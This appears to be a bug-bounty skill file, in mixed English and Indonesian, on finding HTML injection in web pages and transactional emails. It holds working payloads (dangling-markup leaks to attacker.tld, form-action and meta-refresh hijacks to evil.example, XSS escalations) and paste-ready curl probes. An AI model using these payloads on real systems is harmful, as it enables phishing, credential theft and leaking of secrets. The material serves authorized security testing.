---
name: hunt-html-injection
description: "Hunt HTML Injection — user-supplied input is rendered as raw HTML in the response without sanitisation, allowing an attacker to inject arbitrary HTML tags (but not necessarily JavaScript). Lower severity than XSS but enables phishing, UI manipulation, and credential harvesting via injected forms. Use when testing text-display surfaces (search results, profile fields, comments, error messages, feedback forms). For markup that executes JavaScript, escalate to hunt-xss."
sources: hackerone_public, public_research
report_count: 6
---

> **Extra attack variants** (OpenEMR + PHP-core advisories — see §B): `skills/security/exploit-cookbook/references/openemr-php-advisory-techniques.md`


## What is HTML Injection

HTML Injection occurs when user input is inserted into a page's HTML without escaping, so injected tags are rendered by the browser as markup rather than displayed as literal text. Unlike XSS, the injected content does not require JavaScript execution — injecting `<b>`, `<h1>`, `<a>`, `<img>`, or `<form>` tags is sufficient.

**To PROVE impact unambiguously, escalate to an active vector carrying a unique numeric canary** — e.g. `"><img src=x onerror=alert(91234)>` or `<svg onload=alert(91234)>`. A distinctive 4+ digit number (not `alert(1)`) distinguishes YOUR reflected injection from the example payloads practice pages embed in their own hint text. Proof = the raw, unescaped vector with your canary appears in the response.

**Impact:**
- Phishing via injected `<form>` or `<a href="attacker.com">` tags
- UI defacement — `<h1>HACKED</h1>` renders visually on the page
- Credential harvesting via injected login forms
- Redirect via `<meta http-equiv="refresh">`
- Stepping stone to XSS (may be blocked by WAF on `<script>` but not `<img onerror>`)
- **Dangling-markup exfiltration** — even with `<script>` and event handlers filtered, an *unterminated* tag can capture page content that follows it. Inject `<img src='//attacker.tld/log?html=` (no closing quote/`>`); the browser treats everything up to the next `'` as the URL, leaking any CSRF token, secret, or PII rendered after your injection point to your server. Works where full XSS is blocked but raw `<` is reflected.
- **Email/notification-context injection** — a field reflected unescaped into a transactional email (signup confirmation, admin alert, support-chat transcript) renders injected `<a>`/`<img>`/dangling markup in the *recipient's* inbox — an audience the web UI can't reach, and often the only place HTML is rendered unfiltered. Inject into name/subject/comment, then read the raw email source. Disclosed class: <https://hackerone.com/reports/1935628>, <https://hackerone.com/reports/3556892>.

## Attack Surface

Any input that is reflected or stored and then displayed in an HTML context:
- Search boxes (`?q=`)
- Comments, feedback, reviews
- Profile fields (name, bio, username)
- Error messages (`?error=`, `?message=`)
- Subject / body of contact forms
- Admin-visible fields (ticket titles, usernames in logs)

## Email-template injection — the out-of-band sink (verified 2026-09)

The classic hunt only looks at the *reflected response*. The highest-yield variant of this class is
**server-rendered transactional email**, where you never see the sink in the browser — you have to
receive the mail. Transactional templates (invite member, member added, role changed, password
reset, receipts, "X shared Y with you") interpolate stored user-controlled strings with raw HTML.

**Recipe**
1. Have a mailbox you control for the target (disposable inbox, or a plus-alias of your own address
   — `you+tag@domain` usually lands in the same inbox).
2. Put the payload into a **stored** field the template interpolates — member/invitee full name,
   display name, company name, custom-field label, project/list name. Free-text "name" fields on
   invite/member flows are the sweet spot.
3. Trigger the email to your own address, then read the **raw HTML part** (IMAP `msg.html`, or
   "show original" in the client). Grep it for your canary, not for your payload string — the ESP
   may rewrite URLs (Mandrill click-tracking rewrote `https://evil.example/v` into
   `mandrillapp.com/track/click/…` while *preserving the destination*, which actually strengthens
   the PoC).
4. Payload shapes: `<b>CANARY</b>` for the minimal proof; `<a href=https://evil.example/v>Verify</a>`
   (unquoted attr) when a name field rejects quotes or splits on spaces. If the app splits full
   names on the first space into first/last, a no-space payload survives intact.

**Root-cause accelerator — compare sibling interpolations in the SAME email.** If the inviter's name
is escaped (`&lt;b&gt;INJ&lt;/b&gt; X has invited you…`) but the invitee's name renders raw
(`<strong>Hi <a href=…>Verify</a>,</strong>`), the bug is a single missing escape, not "by design" —
and that contrast is the single most persuasive piece of evidence you can hand a triager. Look for it.

**Make it repeatable.** The payload is stored on the record, so re-sending the invitation
(`POST /users/invitation {email}` or the UI "resend" button) re-delivers the malicious email on
demand. Demonstrate the re-render — it converts a one-shot into an attacker-repeatable primitive.

**Controls to run before claiming**
- Same value in the app UI: escaped by the frontend framework → the bug is email-template-specific
  (say so; it prevents an "it's just React escaping" rebuttal).
- Is the from-domain, SPF and DKIM still the brand's? Yes → it is a *brand-phishing* primitive, NOT
  arbitrary sender spoofing. Never claim ATO / XSS / arbitrary `From`.

**Honest severity.** Baseline P4, with a P3 request only when (a) the program itself lists email
template injection as a focus/top class, (b) the recipient is attacker-chosen (third party, not
self-sent), and (c) the payload renders as a real styled link. Never inflate past that: no data is
compromised by an HTML-injected email.

**Evidence to keep:** raw HTML of the received mail + the API/UI request that seeded the field +
the sibling-field contrast snippet. Screenshots of the rendered mail are secondary to raw source.

## Autonomous Testing Priority

**Inject a recognisable HTML tag with a unique canary string. Unescaped angle brackets in the response = confirmed injection.**

**Pattern 1 — Basic HTML tag injection:**
```
<b>CANARY</b>
"><b>CANARY</b>
```
Use a unique string as CANARY (something distinct to this test run). **Proof:** the response contains `<b>CANARY` with literal `<` angle brackets — not `&lt;b&gt;CANARY`. A properly encoded app would escape `<` to `&lt;`.

**Try multiple tag types when `<b>` is filtered:**
- `<h1>CANARY</h1>` — heading tag (often less filtered)
- `<img src=x onerror=CANARY>` — attribute context
- `<a href="https://attacker.com">click</a>` — link injection (phishing proof)

**For stored injection:** inject into the storage endpoint, then GET the page where the value is displayed and check for unescaped tags.

**Escalate immediately:** if `<b>` injection works, try `<script>alert(1)</script>` — the same unsanitised input may allow full XSS.

## Proof

Confirmed when your injected tag appears in the response body with literal `<` angle brackets (not HTML-encoded). A safe app renders `&lt;b&gt;CANARY&lt;/b&gt;`; a vulnerable app renders `<b>CANARY</b>`.

## Distinguishing HTML Injection from XSS

- HTML injection: `<b>text</b>` renders as **text** in the browser — no JS execution needed.
- XSS: `<script>alert(1)</script>` executes JavaScript.

Some WAFs block `<script>` but pass `<b>` or `<img>` — start with non-script tags, then escalate.

## Minimum 5 probes (wajib sebelum kelas ini boleh N/A)

| # | Probe | Kenapa ini dulu |
|---|---|---|
| 1 | Konteks refleksi: HTML body / atribut / URL / JS — tentukan di mana | Menentukan dampak |
| 2 | Form action injection: `<form action="evil">` menimpa form asli | Pencurian kredensial |
| 3 | `<meta http-equiv=refresh>` & `<base href>` | Redirect & ubah base URL |
| 4 | `<iframe srcdoc>` / `sandbox` | Eksekusi dalam konteks |
| 5 | Tanpa eksekusi JS: tetap laporkan kalau ada rantai nyata (phishing, deface) | Jangan klaim XSS tanpa eksekusi |

**Aturan:** kalau salah satu probe belum dijalankan, kelas ini **belum boleh** ditulis
N/A. N/A harus menyebut probe mana yang sudah dicoba dan hasilnya.

## Gate 0 Validation

1. **Apa yang bisa dilakukan penyerang SEKARANG?** "Penyerang bisa menyisipkan form login palsu di halaman target untuk mencuri kredensial" — tunjukkan rendering.
2. **Apa yang hilang dari korban?** Kredensial atau data yang dimasukkan korban ke elemen palsu.
3. **Bisa direproduksi 10 menit dari nol?** Sertakan URL dan tangkapan layar hasil rendering.

## Eskalasi wajib (jangan berhenti di kelas ini)

**Primitif:** suntikkan HTML

**Teknik pengembangan:** form phishing di halaman sah; email HTML injection

**Eskalasi ke:** `hunt-xss` · `hunt-ato`

**Depth target:** L2 -> L4

Satu temuan di kelas ini WAJIB menyebut eskalasi berikutnya (atau alasan primitif habis).
Lihat `exploit-chain-graph` + `exploit-depth` (L0-L5). `depth_gate.py` memblokir temuan
yang buktinya cuma status code.

## Runnable probes

Commands you can paste. `<TARGET>`/`<RPC>` are placeholders — fill them
from recon, do not guess endpoints.

```bash
# 0) confirm the reflection CONTEXT before anything else
curl -sS 'https://<TARGET>/search?q=zhtml1canary' -o base.html
curl -sS 'https://<TARGET>/search?q=zhtml1canary' | grep -oE '.{60}zhtml1canary.{60}' | head

# 1) context probes (each answers a different question)
curl -sS 'https://<TARGET>/search?q=%22%3E%3Cb%3EMARK%3C/b%3E' | grep -c '<b>MARK</b>'   # HTML body
curl -sS 'https://<TARGET>/search?q=%22%20onmouseover%3D%22MARK'  | grep -c 'onmouseover=' # attribute break-out
curl -sS 'https://<TARGET>/search?q=%3C/form%3E%3Cform%20action%3D%22https://evil.example%22%3E' | grep -c 'evil.example'

# 2) form action injection — the credential-theft shape (real impact, no JS needed)
curl -sS 'https://<TARGET>/login?next=%3Cform%20action%3D%22https://evil.example/c%22%3E' -o f.html
grep -oE '<form[^>]*action="[^"]*"' f.html | head

# 3) meta-refresh / base-href — navigation hijack without a redirect parameter
curl -sS 'https://<TARGET>/?x=%3Cmeta%20http-equiv%3Drefresh%20content%3D%220%3Burl%3Dhttps://evil.example%22%3E' \
  | grep -oiE '<meta http-equiv=refresh[^>]*>'

# 4) iframe srcdoc / sandbox escape
curl -sS 'https://<TARGET>/?x=%3Ciframe%20srcdoc%3D%22%3Cscript%3Eparent.document.body.innerHTML%3D1%3C/script%3E%22%3E' \
  | grep -c 'srcdoc'

# 5) decide: XSS or HTML-injection? (the severity hinge)
curl -sS 'https://<TARGET>/?x=%3Csvg%2Fonload%3Dalert(document.domain)%3E' | grep -c 'onload='
```

**Proof bar:** a rendered element the victim's browser acts on (form action, meta
refresh, iframe). "HTML is reflected unescaped" alone is an observation; the
finding is the element that changes what the victim's browser *does*.

---

## 2026 sweep (dork pass 2026-10-26 — advisori terverifikasi)

- **CVE-2026-48060 — Litestar: HTML injection through CSRF token.** Token CSRF dirender tanpa escaping.
  Lesson: nilai yang dihasilkan aplikasi bisa menjadi sink kalau posisinya dipengaruhi pengguna — uji refleksi token/nonce/ID, bukan hanya input formulir.
- **CVE-2026-46546 — Frappe LMS: header tag injection leading to open redirect.**
  Lesson: `<meta http-equiv=refresh>` dan `<base href>` mengubah navigasi dan resolusi URL relatif tanpa parameter redirect — sink yang sering terlewat.

**Probe inti:** tentukan konteks refleksi (HTML body / atribut / URL / JS), lalu uji `<form action="evil">` (form action injection untuk mencuri kredensial), `<meta http-equiv=refresh>`, `<base href>`, dan `<iframe srcdoc>`. Tanpa eksekusi JS, tetap laporkan kalau ada rantai nyata (phishing, deface) — jangan klaim XSS tanpa eksekusi.


## Critical severity anchor (kelas ini bisa Critical — syaratnya)

| Sink | Severity |
|---|---|
| `<meta http-equiv=refresh>` → redirect ke host attacker | High |
| `<base href="evil">` → resolusi URL relatif dialihkan | High-Critical |
| `<form action="evil">` → pencurian kredensial (phishing) | High |
| `<iframe srcdoc>` → eksekusi dalam konteks halaman | Critical (ini XSS) |
| Refleksi teks polos tanpa tag | Info |

**Kalibrasi wajib:** tanpa eksekusi JS, tetap laporkan kalau ada rantai nyata (phishing, deface).
Jangan klaim XSS tanpa eksekusi.

## 2026 sweep

- **CVE-2026-46546 (Frappe LMS)** — header tag injection → open redirect. `<meta http-equiv=refresh>`
  dan `<base href>` mengubah navigasi dan resolusi URL relatif tanpa parameter redirect — sink yang
  sering terlewat.
- **Content-Type sniffing** — respons `text/plain` yang di-sniff browser sebagai HTML. Cek
  `X-Content-Type-Options: nosniff`.
- **Refleksi di atribut tanpa quote** — `<img src=x onerror=...>` kalau refleksi masuk ke atribut
  tanpa escaping quote.
- **Email HTML injection** — template email yang mencerminkan input user; klien email berbeda
  sanitization dari browser.
